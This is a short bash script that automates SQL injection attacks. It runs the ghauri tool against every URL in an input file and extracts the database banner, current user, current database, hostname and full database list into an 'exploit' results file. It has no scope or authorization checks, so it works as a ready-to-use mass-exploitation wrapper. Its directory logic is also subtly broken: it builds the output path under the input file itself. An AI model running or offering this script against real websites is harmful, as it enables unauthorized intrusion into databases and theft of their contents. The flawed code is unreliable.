#!/bin/bash

# Function to perform SQL injection testing for given URLs
sql_testing() {
    local input_file=$1
    local date=$(date +'%Y-%m-%d')
    local base_dir="${input_file}/$([ "$IGNORE_SPLIT" = "false" ] && echo "${date}/")"
    local exploit_dir="${base_dir}/exploit"
    
    mkdir -p "${exploit_dir}"

    # Check if input file exists
    if [[ ! -f "${input_file}" ]]; then
        echo "Error: ${input_file} not found!"
        exit 1
    fi

    # Check if ghauri is installed
    if ! command -v ghauri &> /dev/null; then
        echo "Error: ghauri is not installed. Please install it first."
        exit 1
    fi

    # Perform SQL injection testing and save the results
    echo "Performing SQL injection testing on ${input_file}..."
    cat "${input_file}" | uro | while read -r host; do
        echo "Testing $host" | tee -a "${exploit_dir}/sql_results.txt"
        ghauri -u "$host" --batch --level=3 -b --current-user --current-db --hostname --dbs | tee -a "${exploit_dir}/sql_results.txt"
        echo "------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------" | tee -a "${exploit_dir}/sql_results.txt"
    done

    echo "Script execution completed. Check ${exploit_dir}/sql_results.txt for SQL injection testing results."
}

# Check if input file is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <input_file>"
    exit 1
fi

# Run the SQL testing function with the provided input file
sql_testing "$1"
